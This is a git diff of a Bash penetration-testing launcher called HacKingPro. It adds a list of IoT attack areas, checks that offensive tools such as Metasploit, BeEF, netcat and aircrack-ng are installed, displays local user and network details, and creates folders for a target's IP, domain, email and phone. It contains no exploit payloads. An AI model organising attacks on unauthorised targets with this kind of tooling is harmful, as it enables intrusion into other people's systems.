@@ -18,7 +18,7 @@
 #                                                             #
 #-Metadata----------------------------------------------------#
 #                                                             #
-#  Filename: HacKingPro                  (Update: 08-08-2022) #
+#  Filename: HacKingPro                  (Update: 10-08-2022) #
 #  Source: https://github.com/Anlominus/HacKingPro            #
 #                                                             #
 #-Info--------------------------------------------------------#
@@ -36,13 +36,69 @@
 #     Tested on: MacOS                                        #
 #                                                             #
 #-Notes-------------------------------------------------------#
-# - 1] Run as root
-# - 2] complete section
-# - 3] Implement Anonymous Installer [*]
 #                             ---                             #
-#                                                             #
-###############################################################
+# - 1] Run as root                                            $
+#                             ---                             #
+#-ToDO--------------------------------------------------------#
+# [1]
+Common_IoT_Attack_Areas(){
+  echo "
+##### Common IoT Attack Areas
 
+      Network traffic
+      Device Firmware
+      Mobile application
+      Device web interface
+      Device network services
+      Device update mechanism(s)
+      Unencrypted Local data storage
+      Device / Ecosystem Access Control
+      Device memory containing credentials
+      Device Physical Interfaces / Fimrware extraction
+      Devices administrative interface(s)
+      Cloud interface(s)
+      Insecure API's (vendor & thir-party)
+      Confidentiality and Integrity issues across the ecosystem
+"
+}
+#                             ---                             #
+#                             ---                             #
+###############################################################
+clear
+###############################################
+#         Put Current PID in Variable
+###############################################
+
+thisPID=$(echo "$$")
+currentPID=$(echo "$thisPID")
+
+
+# IF NO TARGET DO DEFAULT
+if [ -z ${1}  ]; then
+  # IF NO TARGET SET AnLoMinus
+  if [ -z "$targetNAME" ]; then
+    # setting target name
+    targetNAME="AnLoMinus"
+  fi
+else
+  # setting target name
+  targetNAME="${1}"
+fi
+
+###############################################
+MainDirectoriy="$(pwd)"
+# Define Case {Variable}
+MainDirectoriyCase="${MainDirectoriy}/Case"
+# Define Case Name {Variable}
+MainDirectoriyCaseName="${MainDirectoriyCase}/${targetNAME}"
+# Create Case Folder
+mkdir "${MainDirectoriyCase}"
+# Create Case Name Folder
+mkdir "${MainDirectoriyCaseName}"
+# Define Variables For Case Local Directory
+MainDirectoriyCaseNameLocal="${MainDirectoriyCaseName}/Local"
+mkdir "${MainDirectoriyCaseNameLocal}"
+###############################################
 
 if [ ${1} == "-d" ]; then
   #statements
@@ -246,19 +302,19 @@ HacKingProColors
 # ♥️ ✯ 🔞 🗨 👩‍ 💻 😜 😡
 # 💥 ☣ ✍ █ ▓ ░ ▒ 💿 🎧 📸
 # 👤
-cEye="${BGreen} 👁 $cyan"
-cWall="$purple[$purple░$purple]$cyan"
-cDock="$purple[${BGreen}📌$purple]$cyan"
-cPassKey="$purple[${BGreen}🔐$purple]$cyan"
-cAnlominus="$purple[${BGreen}👽$purple]$cyan"
-cAlien="$purple[${BGreen}🙏$purple]$cyan"
+cEye="${BGreen} 👁 ${BCyan}"
+cWall="$purple[$purple░$purple]${BCyan}"
+cDock="$purple[${BGreen}📌$purple]${BCyan}"
+cPassKey="$purple[${BGreen}🔐$purple]${BCyan}"
+cAnlominus="$purple[${BGreen}👽$purple]${BCyan}"
+cAlien="$purple[${BGreen}🙏$purple]${BCyan}"
 cGlasses="$purple[${BGreen}👓$purple]$yellow"
 cLock="${BRed}[$yellow🔒${BRed}]$grey"
 cInvalid="${BRed}[$yellow🚫${BRed}]${BRed}"
 cKey="${BRed}[$yellow🔑${BRed}]$yellow"
 cLink="${BRed}[$orange🔗${BRed}]$orange"
 cSharp="${BRed}[$yellow#${BRed}]${BBlue}"
-cWhat="${BRed}[$yellow?${BRed}]$cyan"
+cWhat="${BRed}[$yellow?${BRed}]${BCyan}"
 cInfo="${BRed}[$yellow!${BRed}]${BBlue}"
 cPlus="${BRed}[${BGreen}+${BRed}]$white"
 cDone="${BRed}[${BGreen}✔${BRed}]${BGreen}"
@@ -297,11 +353,11 @@ lahs(){
 #         HacKingPro Variables          #
 #########################################
 
-LastUPDATE="2022 August 8"
+LastUPDATE="2022 August 10"
 ToolSource="https://github.com/AnLoMinus/HacKingPro"
 HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro$resetT")
 Anlominus=$(echo "${BGreen}An${DGrey}Lo${BRed}Minus")
-MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}25")
+MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}26")
 HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
@@ -312,30 +368,151 @@ InvalidOption=$(echo "\n\t\t ${BGreen}»»» ${HacKingPro} ${LRed}Invalid Option
 #         Checking Running Direction
 ###############################################
 
-BeautyPrint(){
+AwesomePrint(){
   echo "\n"
-  echo "    ${ORANGE}${faintT}┌╼  $1 $2 $3 $4 "
-  echo "    ${ORANGE}${faintT}|─╼  $1 $2 $3 $4 "
+  echo "    ${ORANGE}${faintT}┌╼  $dcdv "
+  sleep 0.1
+  echo "    ${ORANGE}${faintT}|─╼  $dcdv "
+  sleep 0.1
   echo "    ${resetT}${ORANGE}|──╼ $5 "
-  echo "    ${ORANGE}${faintT}|─╼  $1 $2 $3 $4 "
-  echo "    ${ORANGE}${faintT}└╼  $1 $2 $3 $4 "
+  sleep 0.1
+  echo "    ${ORANGE}${faintT}|─╼  $dcdv "
+  sleep 0.1
+  echo "    ${ORANGE}${faintT}└╼  $dcdv "
+  echo "\n${resetT}"
+}
+
+AwesomeLine(){
+	local WhatHeader="$@"
+  echo "\n"
+  echo "${BBlue}🔮-=x=-=x=-=x=-=x=-=x=-=x=-=${LYellow}[ ${slowBlink}${WhatHeader}${resetT} ${LYellow}]${BBlue}=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-🔮"
+  echo "\n${resetT}"
+}
+MiniHeaderSta(){
+  echo " ${BYellow}"
+  figlet -f small $1
+  echo " "
+  echo "    ${LGreen}${faintT}┌───${ORANGE}╼${resetT}${LGreen}╼▰  ${resetT}${ORANGE}[ ${LYellow}$@${ORANGE} ] ${resetT}"
+  echo "    ${LGreen}${faintT}|"
+}
+MiniHeaderEnd(){
+  echo "    ${LGreen}${faintT}|"
+  echo "    ${LGreen}${faintT}└───${ORANGE}╼${resetT}${LGreen}╼▰  ${resetT}${ORANGE}[ ${LYellow}$@${ORANGE} ] ${resetT}"
+  echo " "
+}
+
+# 🔮 - Function to check required programs
+CheckThatPro(){
+  sleep 0.1
+  if [ -z $1 ]; then
+    echo "\n"
+    echo "    ${LRed}|──╼${BRed}[${slowBlink} ❌ ${resetT}${BRed}]${LRed}──╼▰ ${BRed}[${LRed} Please Set Something To Find ${BRed}]"
+    echo "\n"
+  else
+    which ${1} &> /dev/null
+    if [ ${?} = 0 ]; then
+      ToolPath=$(which ${1})
+      echo "    ${BCyan}${faintT}|──╼${resetT}${BRed}[ ✅ ]${BCyan}${faintT}──╼${resetT}${LGreen}╼▰ ${LCyan}[ ${1} ]${BCyan}${faintT}──╼${resetT}${LGreen}╼▰ ${BRed}[${BCyan} ${ToolPath} ${BRed}]"
+    else
+      echo "    ${BCyan}${faintT}|──╼${resetT}${BRed}[ ${slowBlink}❌${resetT}${BRed} ]${BCyan}${faintT}──╼${resetT}${LRed}╼▰ ${BRed}[ ${1} ]${BCyan}${faintT}──╼${resetT}${LRed}╼▰ ${BRed}[ Sorry ${BRed}Not Found! ${BRed}]"
+    fi
+  fi
+}
+
+CheckRequiredPro(){
+  AwesomeLine "🔶 Checking Required Programs 🔶"
+
+  MiniHeaderSta "System Pack"
+  CheckThatPro ps
+  CheckThatPro sh
+  CheckThatPro nc
+  CheckThatPro su
+  CheckThatPro top
+  CheckThatPro git
+  CheckThatPro zsh
+  CheckThatPro apt
+  CheckThatPro sudo
+  CheckThatPro bash
+  CheckThatPro less
+  CheckThatPro last
+  CheckThatPro host
+  CheckThatPro ping
+  CheckThatPro whoami
+  CheckThatPro figlet
+  CheckThatPro python
+  CheckThatPro python2
+  CheckThatPro python3
+  CheckThatPro apktool
+  CheckThatPro tcpdump
+  CheckThatPro netstat
+  CheckThatPro ifconfig
+  CheckThatPro enum4linux 
+  MiniHeaderEnd "System Pack"
+  read -p "${Press_ENTER}"
+
+  MiniHeaderSta "Reconnaissance & Information Gathering "
+  CheckThatPro ip
+  CheckThatPro who
+  CheckThatPro dig
+  CheckThatPro arp
+  CheckThatPro curl
+  CheckThatPro wget
+  CheckThatPro nmap
+  CheckThatPro dirb
+  CheckThatPro amass
+  CheckThatPro whois
+  CheckThatPro nikto
+  CheckThatPro tshark
+  CheckThatPro kismet
+  CheckThatPro dnsmap
+  CheckThatPro dnswalk
+  CheckThatPro dnsenum
+  CheckThatPro gobuster
+  CheckThatPro nslookup
+  CheckThatPro dnsrecon
+  CheckThatPro beef-xss
+  CheckThatPro SubFinder
+  CheckThatPro Sublist3r
+  CheckThatPro smbclient
+  CheckThatPro wireshark
+  CheckThatPro traceroute
+  CheckThatPro netdiscover
+  MiniHeaderEnd "Reconnaissance & Information Gathering "
+  read -p "${Press_ENTER}"
+
+  MiniHeaderSta "Delivery "
+  CheckThatPro ssh
+  CheckThatPro ftp
+  MiniHeaderEnd "Delivery "
+  read -p "${Press_ENTER}"
+
+  MiniHeaderSta "Exploitation "
+  MiniHeaderSta "Metasploit Framework"
+  CheckThatPro msfd
+  CheckThatPro msfdb
+  CheckThatPro msfrpc
+  CheckThatPro msfvenom
+  CheckThatPro msfconsole
+  MiniHeaderEnd "Metasploit Framework"
+  MiniHeaderEnd "Exploitation "
+  read -p "${Press_ENTER}"
+
+  MiniHeaderSta "WiFi HacKing"
+  CheckThatPro wifite
+  CheckThatPro airmon-ng
+  CheckThatPro airbase-ng
+  CheckThatPro aircrack-ng
+  CheckThatPro airodump-ng
+  CheckThatPro aireplay-ng
+  CheckThatPro airdecap-ng
+  CheckThatPro airdecloak-ng
+  MiniHeaderEnd "WiFi HacKing"
+  read -p "${Press_ENTER}"
+
+  AwesomeLine "✅ Finish Checking Required Programs ✅"
+
   echo "\n"
 }
-
-CheckPWD(){
-  # Define Current Direction Variable
-  MainDirectoriy="$(pwd)"
-  dcdv=$(echo "Define Current Direction Variable")
-  BeautyPrint ${dcdv} ${MainDirectoriy}
-}
-CheckPWD
-
-###############################################
-#         Put Current PID in Variable
-###############################################
-
-thisPID=$(echo "$$")
-currentPID=$(echo "$thisPID")
 
 #########################################
 #         HacKingPro Variables          #
@@ -639,7 +816,7 @@ CoverMe(){
 # Clear Target VARIABLES
 ClearTarget(){
 echo "\n\n"
-echo "    ┌──[ cl ]──╼ [ ⚡️ Cleaning Target Variables 🎯 ]"
+echo "    ┌──[ cl ]──╼ [ ⚡️ 🧹 Cleaning Target Variables  🧹 ]"
 sleep 1
 echo "    |"
 echo "    |──[ 🧹 ]──[ ✅ ]──╼  IP:  "
@@ -832,22 +1009,12 @@ HacKingProPlanning(){
   echo "          ${BRed}======================================================================================="
   echo "\n"
 
-  # Define Case {Variable}
-  MainDirectoriyCase="${MainDirectoriy}/Case"
-  # Create Case Folder
-  mkdir "${MainDirectoriyCase}"
   # Continue Case Folder
   cd "${MainDirectoriyCase}"
 
   # Input Target Name
   ReadTargetNameFromtheUser
 
-  # Define Case Name {Variable}
-  MainDirectoriyCaseName="${MainDirectoriyCase}/${targetNAME}"
-  # Create Case Name Folder
-  mkdir "${MainDirectoriyCaseName}"
-  # Continue Case Name Folder
-  cd "${MainDirectoriyCaseName}"
 
   # Define Case Name Planing {Variable}
   MainDirectoriyCaseNamePlanning="${MainDirectoriyCaseName}/Planning"
@@ -901,7 +1068,7 @@ HacKingProPlanning(){
 
 }
 
-# Target Planning Status
+# [Fun]ctions Target Planning Status
 FunTargetDns(){
   #statements
   if [ -z ${targetDns} ]; then
@@ -1162,26 +1329,27 @@ Check_System() {
   # checking for system package manager
   echo "\n"
   if [ -e /data/data/com.termux/files/usr/bin/pkg ]; then
-    pac="pkg"
-    system="termux"
+    MyPackManager="pkg"
+    MySystem="termux"
   elif [ $(command -v brew) ]; then
-    pac="brew"
-    system="mac"
+    MyPackManager="brew"
+    MySystem="MacOS"
     sudo=""
   elif [ $(command -v apt) ]; then
-    pac="apt"
-    system="linux"
+    MyPackManager="apt"
+    MySystem="linux"
   elif [ $(command -v apt-get) ]; then
-    pac="apt-get"
-    system="linux"
+    MyPackManager="apt-get"
+    MySystem="linux"
   elif [ $(command -v apk) ]; then
-    pac="apk"
-    system="linux"
+    MyPackManager="apk"
+    MySystem="linux"
   elif [ $(command -v yum) ]; then
-    pac="yum"
-    system="fedora"
+    MyPackManager="yum"
+    MySystem="fedora"
   fi
-  echo "    ${BCyan}${faintT}┌──${resetT}${BRed}[${DGrey} System ${BRed}]${faintT}${BCyan}───────────╼${resetT} ${BRed}[${DGrey} ${system} ${BRed}]"
+
+  echo "    ${BCyan}${faintT}┌──${resetT}${BRed}[${DGrey} System ${BRed}]${faintT}${BCyan}───────────╼${resetT} ${BRed}[${DGrey} ${MySystem} ${BRed}]"
 
   # checking for system root access
   if [ $(command -v sudo) ]; then
@@ -1200,89 +1368,86 @@ Check_System() {
 
   # checking for system bin dir
   if [ -d /data/data/com.termux/files/usr/bin ]; then
-    bin="/data/data/com.termux/files/usr/bin"
+    MyBinDirectory="/data/data/com.termux/files/usr/bin"
   elif [ -d /usr/local/bin ]; then
-    bin="/usr/local/bin"
+    MyBinDirectory="/usr/local/bin"
   elif [ -d /bin ]; then
-    bin="/bin"
+    MyBinDirectory="/bin"
   elif [ -d /sbin ]; then
-    bin="/sbin"
+    MyBinDirectory="/sbin"
   fi
-  echo "    ${BCyan}${faintT}|──${resetT}${BRed}[${DGrey} bin dir ${BRed}]${faintT}${BCyan}──────────╼${resetT} ${BRed}[${DGrey} ${bin} ${BRed}]"
-  echo "    ${BCyan}${faintT}└──${resetT}${BRed}[${DGrey} package manager ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} ${pac} ${BRed}]"
+  echo "    ${BCyan}${faintT}|──${resetT}${BRed}[${DGrey} My Pack Manager ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} ${MyPackManager} ${BRed}]"
+  echo "    ${BCyan}${faintT}└──${resetT}${BRed}[${DGrey} My Bin Directory ${BRed}]${faintT}${BCyan}─╼${resetT} ${BRed}[${DGrey} ${MyBinDirectory} ${BRed}]"
   # cp $0 ${bin}
 
-  read -p "${Press_ENTER}"
-}
-Check_System
-
-# Checking If User is Root
-CheckingIfRoot(){
-  ROOT_UID=0
-  if [ "$UID" -eq "$ROOT_UID" ]; then
-    echo "Yes, you are root."
-  else
-    echo "No, you are not root"
-  fi
-}
-
-# Checking Cheatsheets
-Checking_IP_Target(){
-  if [ -z $targetIP ]; then
-    #statements
-    clear
-    # HacKingProLogo1
-    echo "
-    ${ToolHeader}
-
-    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
-    ${DGrey}|
-    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} $(date) ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ${StartingTime} ${BRed}]
-    ${DGrey}|
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
-    ${DGrey}|
-    ${DGrey}└──${BRed}[${DGrey} CL ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Cleaning Target Variables ${BRed}] "
-
-    echo "\n    ${BGreen}[${BRed} ERROR ${BGreen}]${BRed}──╼ ${BGreen}[ ❌ ]${BRed}──╼  ${BGreen}[${BRed} You need Enter IP Before Scanning ${BGreen}] \n"
-    sleep 1
-    echo "    ${BGreen}┌──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
-    sleep 1
-    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
-    sleep 1
-    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
-    sleep 1
-    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
-    sleep 1
-    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
-    sleep 1
-    echo "    ${BGreen}└──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
-    sleep 1
-    read -p "$Press_ENTER" readthat
-    cd "${MainDirectoriy}"
-    break
-  fi
+  # read -p "${Press_ENTER}"
+  # if [ $1 == "UpdateOS" ]; then
+    # statements
+    # if [ $MySystem == "MacOS" ]; then
+      # AwesomeLine "Updating MacOS"
+      # softwareupdate -l
+      # fi
+      # fi
+  # if [ $MySystem == "MacOS" ]; then
+    # say ${MySystem}
+  # fi
 
 }
 
 CheckInternetConnection(){
   ping -c 1 google.com > /dev/null 2>&1
   if [[ "$?" == 0 ]]; then
-    InternetStatus="\n     ${DGrey}[${BYellow} Internet Connection ${DGrey}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${DGrey}[${BGreen}${slowBlink} True ${resetT}${DGrey}]${BYellow}${faintT}───────╼${resetT}${BYellow}▰▰▰\n"
+    InternetStatus="\n     ${DGrey}[${BYellow} Internet Connection ${DGrey}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${DGrey}[${BGreen}${slowBlink} True ${resetT}${DGrey}]${BYellow}${faintT}───────╼${resetT}${BYellow}▰▰▰"
     echo "${InternetStatus}"
-    read -p "${Press_ENTER}"
   else
-    InternetStatus="\n     ${DGrey}[${BRed}-${DGrey}]${BYellow}${faintT}──╼  ${resetT}${DGrey}[${BYellow}  Internet Connection ${DGrey}]${BYellow}${faintT}──╼ ${DGrey}[${BRed}${slowBlink} False ${resetT}${DGrey}]\n"
+    InternetStatus="\n     ${DGrey}[${BRed}-${DGrey}]${BYellow}${faintT}──╼  ${resetT}${DGrey}[${BYellow}  Internet Connection ${DGrey}]${BYellow}${faintT}──╼ ${DGrey}[${BRed}${slowBlink} False ${resetT}${DGrey}]"
     echo "${InternetStatus}"
-    read -p "${Press_ENTER}"
   fi
 }
-CheckInternetConnection
+
+#---------------------------------------#
+# CLI | Get information User localhost  #
+#---------------------------------------#
+GetLocalUserInfo() {
+  user=$(whoami)      2> /dev/null # Current user
+  host=$(uname -n)    2> /dev/null # Network node hostname
+  home=$(echo $HOME)  2> /dev/null # User home directory
+  usid=$(id -u)       2> /dev/null # User ID
+  gpid=$(id -g)       2> /dev/null # Group ID
+  grps=$(for i in $(groups | tr "," " "); do echo "\t\t${BRed}[${LYellow} $i ${BRed}]"; done)      2> /dev/null # List all groups
+  echo "
+    ${DGrey}┌───────╼ ${BRed}[${BYellow} User Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} Username  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${user} ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${BYellow} Hostname  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${host} ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${BYellow} Home Path ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${home} ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${BYellow} EUID      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${usid} ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${BYellow} User ID   ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} \n$(for i in $(id | tr "," " "); do echo "\t${BRed}[${LYellow} $i   ${BRed}]"; done) ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${BYellow} EGID      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${gpid} ${BRed}]
+    ${DGrey}┖──╼ ${BRed}[${BYellow} Groups    ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${grps} ${BRed}]"
+  read -p "${Press_ENTER}"
+}
+GetLocalNetInfo(){
+  # netstat -nr | grep "lo0" | grep -v "link#" | awk '{print $1}' | grep "^[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*$"
+  LocalHostNAME=$(route get 0.0.0.0 | awk -F": " '/interface:/{print $2}')
+  LocalHostIP="$(ipconfig getifaddr ${LocalHostNAME} 2>/dev/null)"
+  DefaultGatewayIP="$(arp -a 2>/dev/null | head -1 | awk -F"[)(]" '{print $2}')"
+  DefaultGatewayNAME="$(arp -a 2>/dev/null | head -1 | awk -F"[)(]" '{print $1}')"
+  service_all=$(networksetup -listnetworkserviceorder 2>/dev/null)
+  service_raw=$(echo "$service_all" | grep -B1 "Device: $LocalHostNAME)$")
+  HardwarePort=$(echo "$service_raw" | grep "$LocalHostNAME)$" | awk '{print substr($0, index($0,$3))}' | cut -d, -f1 | xargs)
+  HardwarePort_Name="$HardwarePort"
+  LocalHostMacAddress=$(networksetup -getmacaddress "${LocalHostNAME}" 2>/dev/null | awk '/Ethernet/ {print $3}')
+  echo "
+    ${LGreen}┌─╼ ${BRed}[${LGreen} Local Net Info ${BRed}]
+    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Host IP ${BRed}]${LGreen}──────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostIP} ${BRed}]${LGreen}──╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Host NAME ${BRed}]${LGreen}────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostNAME} ${BRed}]${LGreen}─────╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Mac Address ${BRed}]${LGreen}──╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostMacAddress} ${BRed}]${LGreen}─────╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway IP ${BRed}]${LGreen}───╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayIP} ${BRed}]${LGreen}──╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway NAME ${BRed}]${LGreen}─╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayNAME} ${BRed}]${LGreen}╼▰
+    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Hardware NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${HardwarePort_Name} ${BRed}]${LGreen}─╼▰
+  "
+}
 
 ###############################################
 #         Tool Header Status
@@ -1331,9 +1496,75 @@ TargetStatusRun(){
     ${BCyan}${faintT}|──${resetT}${BRed}[ 🎯 ]${BCyan}${faintT}──${resetT}${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${BCyan}${faintT}──╼  ${LRed}${faintT}Email${BBlue}: ${BGreen}${targetEmail}
     ${BCyan}${faintT}|──${resetT}${BRed}[ 🎯 ]${BCyan}${faintT}──${resetT}${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${BCyan}${faintT}──╼  ${LRed}${faintT}Phone${BBlue}: ${BGreen}${targetPhone}
     ${BCyan}${faintT}|
-    ${BCyan}${faintT}└──${resetT}${BRed}[${BCyan} CL ${BRed}]${faintT}${BCyan}──${resetT}${BCyan}╼▰ ${BRed}[${faintT}${BCyan} Cleaning Target Variables ${BRed}]${BCyan}${faintT}───────╼${resetT}${BCyan}▰▰▰
+    ${BCyan}${faintT}└──${resetT}${BRed}[${BCyan} CL ${BRed}]${faintT}${BCyan}──${resetT}${BCyan}╼▰ ${BRed}[${faintT}${BCyan} 🧹 Cleaning Target Variables  🧹 ${BRed}]${BCyan}${faintT}───────╼${resetT}${BCyan}▰▰▰
     ")
     echo "$ToolStatus"
+}
+
+# START Checking
+AwesomeLine "Welcome to ${HacKingPro}"
+
+ToolHeaderRun
+Check_System
+CheckInternetConnection
+GetLocalNetInfo
+CheckRequiredPro
+
+dcdv=$(echo "Define Current Direction Variable")
+AwesomePrint ${dcdv} ${MainDirectoriy}
+
+# Checking If User is Root
+CheckingIfRoot(){
+  ROOT_UID=0
+  if [ "$UID" -eq "$ROOT_UID" ]; then
+    echo "Yes, you are root."
+  else
+    echo "No, you are not root"
+  fi
+}
+
+# Checking Cheatsheets
+Checking_IP_Target(){
+  if [ -z $targetIP ]; then
+    #statements
+    clear
+    # HacKingProLogo1
+    echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} CL ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} 🧹 Cleaning Target Variables  🧹 ${BRed}] "
+
+    echo "\n    ${BGreen}[${BRed} ERROR ${BGreen}]${BRed}──╼ ${BGreen}[ ❌ ]${BRed}──╼  ${BGreen}[${BRed} You need Enter IP Before Scanning ${BGreen}] \n"
+    sleep 1
+    echo "    ${BGreen}┌──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}└──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    read -p "$Press_ENTER" readthat
+    cd "${MainDirectoriy}"
+    break
+  fi
+
 }
 
 ###############################################
@@ -1394,56 +1625,75 @@ BuildingProfiles(){
   $0 >> ${A_All}
 }
 
-###############################################
-#         Paths Directories to Tools
-###############################################
-
-
+######################################
+# Paths Directories to Tools Folders #
+######################################
 xDirectories(){
-
-  # Define Variables For Case Directory
-  MainDirectoriy="$(pwd)"
-
+  # [1] Reconnaissance & Information Gathering Folder
